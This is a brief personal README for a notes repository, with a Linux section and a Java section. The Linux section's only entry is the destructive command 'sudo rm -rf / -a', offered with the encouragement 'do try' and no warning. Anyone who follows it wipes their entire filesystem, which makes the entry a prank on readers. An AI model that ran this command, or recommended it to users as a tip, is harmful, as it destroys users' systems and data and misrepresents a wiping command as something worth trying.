just a personal guide for how i did things so that i don't find myself in trouble later if someone finds this useful feel free to use it ðŸ˜Š
## sections. ##
1. linux -
although its named linux, windows and freeBSD(if i ever add one) cmd will also be in this 
```
sudo rm -rf / -a
```
do try

2. java - just some syntax and things i might forget or i like

its named Jav@ to be able to execute any files directly and not run into issue of a patent file beeing named "Java"
